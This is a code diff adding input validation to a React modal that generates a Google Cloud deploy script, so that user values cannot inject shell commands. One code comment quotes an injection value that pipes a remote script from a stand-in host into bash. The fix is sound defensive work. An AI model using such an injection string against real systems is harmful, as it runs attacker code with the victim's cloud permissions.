@@ -15,9 +15,16 @@
  */
 
 
+import { toErrorMessage } from '../../utils/errors';
 import React, { useState, useEffect } from 'react';
 import { Config, GcsBucket } from '../../types';
 import * as api from '../../services/apiService';
+import {
+    assertValidGcpResourceName,
+    assertValidOpaqueId,
+    assertValidProjectIdentifier,
+    assertValidServiceAccountEmail,
+} from '../../services/shellSafety';
 
 declare let JSZip: any;
 
@@ -476,8 +483,8 @@ const PrunerDeploymentModal: React.FC<PrunerDeploymentModalProps> = ({ isOpen, o
                 });
                 setSkipIamInScript(false);
             }
-        } catch (err: any) {
-            setPermissionCheckResult({ status: 'error', message: `Check failed: ${err.message}` });
+        } catch (err: unknown) {
+            setPermissionCheckResult({ status: 'error', message: `Check failed: ${toErrorMessage(err)}` });
             setSkipIamInScript(false);
         } finally {
             setIsCheckingPermissions(false);
@@ -498,7 +505,57 @@ const PrunerDeploymentModal: React.FC<PrunerDeploymentModalProps> = ({ isOpen, o
     const requirementsTxt = `Flask==3.0.0\ngunicorn==22.0.0\ngoogle-auth>=2.22.0\nrequests>=2.31.0`;
     const dockerfile = `FROM python:3.11-slim\nENV PYTHONUNBUFFERED True\nWORKDIR /app\nCOPY requirements.txt .\nRUN pip install --no-cache-dir -r requirements.txt\nCOPY . .\nCMD ["gunicorn", "--bind", "0.0.0.0:8080", "--workers", "1", "--threads", "8", "--timeout", "0", "main:app"]`;
 
+    /**
+     * SECURITY (F-01): allowlist-validates every user- or API-supplied value that
+     * generateDeploySh()/generateMainPy() splice into the generated scripts.
+     *
+     * deploy.sh is executed by `bash` (Cloud Build step below, or locally after
+     * "Download .zip"), so an unvalidated value such as
+     * `x; curl https://untrusted.example.com/s.sh | bash; #` would run as a shell
+     * command with the Cloud Build service account's project permissions. These
+     * allowlists permit no shell metacharacter at all.
+     *
+     * Throws with a user-facing message; every caller surfaces it via setDeployError.
+     */
+    const validateDeploymentInputs = () => {
+        // Project ID: accepts both a project ID ('my-project-123') and a numeric
+        // project number, which the field is legitimately seeded with (see the
+        // pre-flight warning inside deploy.sh). Both forms are shell-safe.
+        assertValidProjectIdentifier(config.projectId, 'Project ID');
+
+        // Interpolated as REGION and APP_LOCATION; APP_LOCATION is also concatenated
+        // into SERVICE_NAME and JOB_NAME, so it must be a valid resource name anyway.
+        assertValidGcpResourceName(config.runRegion, 'Run region');
+        assertValidGcpResourceName(config.appLocation, 'App location');
+
+        // User store IDs contain underscores (the default is 'default_user_store'),
+        // so the opaque-id allowlist applies rather than the resource-name one.
+        assertValidOpaqueId(config.userStoreId, 'User Store ID');
+
+        // config.pruneDays is coerced to a number before interpolation (pruneDaysVal),
+        // so it cannot carry shell syntax and needs no string validation.
+
+        // customSaEmail is interpolated into deploy.sh as SA_EMAIL="${customSaEmail}".
+        // Double quotes do NOT stop command substitution, so `$(...)` or a backtick
+        // inside it would execute. An empty value is deliberately still allowed: it
+        // means "no custom SA", and generateDeploySh() then emits the default
+        // license-pruner-sa lookup/create block instead (the call site already passes
+        // `customSaEmail.trim() || undefined`).
+        if (customSaEmail.trim()) {
+            assertValidServiceAccountEmail(customSaEmail, 'Service account');
+        }
+    };
+
     const handleDownload = async () => {
+        // SECURITY (F-01): the downloaded deploy.sh is run by a shell on the operator's
+        // machine, so it gets the same validation as the Cloud Build path.
+        try {
+            validateDeploymentInputs();
+        } catch (err: unknown) {
+            setDeployError(toErrorMessage(err, 'Invalid deployment configuration.'));
+            return;
+        }
+
         const zip = new JSZip();
         zip.file('main.py', mainPy);
         zip.file('deploy.sh', deploySh);
@@ -525,6 +582,11 @@ const PrunerDeploymentModal: React.FC<PrunerDeploymentModalProps> = ({ isOpen, o
         setDeployError(null);
 
         try {
+            // SECURITY (F-01): fail fast, before the zip, the GCS upload and the
+            // Cloud Build steps are assembled. deploySh/mainPy are already rendered
+            // for preview, but nothing is executed until the build is created.
+            validateDeploymentInputs();
+
             // 1. Prepare Zip
             const zip = new JSZip();
             zip.file('main.py', mainPy);
@@ -568,8 +630,8 @@ const PrunerDeploymentModal: React.FC<PrunerDeploymentModalProps> = ({ isOpen, o
             // Close modal after successful trigger
             onClose();
 
-        } catch (err: any) {
-            setDeployError(err.message || "Failed to trigger Cloud Build.");
+        } catch (err: unknown) {
+            setDeployError(toErrorMessage(err, "Failed to trigger Cloud Build."));
         } finally {
             setIsDeploying(false);
         }
